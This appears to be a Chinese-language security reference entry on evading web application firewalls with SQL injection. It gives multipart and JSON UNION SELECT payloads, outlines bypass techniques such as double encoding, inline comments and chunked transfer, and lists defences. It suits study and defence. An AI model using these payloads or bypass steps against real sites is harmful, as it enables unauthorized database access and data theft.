> 利用multipart绕过检测
```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1 UNION SELECT 1,2,3--
------WebKitFormBoundary--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_
- `Content-Type` — 内容类型头 _header_

**JSON注入**
> 在JSON数据中注入
```
{"id": "1' UNION SELECT 1,2,3--"}
```
**语法解析：**
- `id:` — 命令/关键字 _command_


**概述：** SQL注入WAF绕过技术是针对Web应用防火墙防护的高级注入手法，通过编码混淆、分块传输、内联注释、大小写变换、等价函数替换等方式规避WAF的规则匹配引擎，在存在WAF防护的环境中依然实现数据库信息提取与权限获取

**漏洞原理：** WAF通常采用正则匹配和关键字检测来拦截SQL注入，但其规则库无法覆盖所有编码变体和语法变形。攻击者利用数据库引擎与WAF解析器之间的差异，构造WAF无法识别但数据库能正常执行的恶意语句

**利用方法：** 首先识别WAF类型和版本（通过响应头、拦截页面特征），然后逐步测试各种绕过手法：URL双重编码、Unicode编码、内联注释拆分关键字(如/!50000SELECT/)、等价函数替换(如MID替代SUBSTR)、HTTP参数污染、分块传输编码等，找到可绕过的payload后提取数据

**防御措施：** 部署参数化查询从根本上杜绝SQL注入，WAF仅作为纵深防御层；定期更新WAF规则库；启用WAF的深度解码功能（递归URL解码、Unicode解码）；对异常请求实施速率限制和行为分析；结合RASP技术在运行时检测SQL注入行为

---
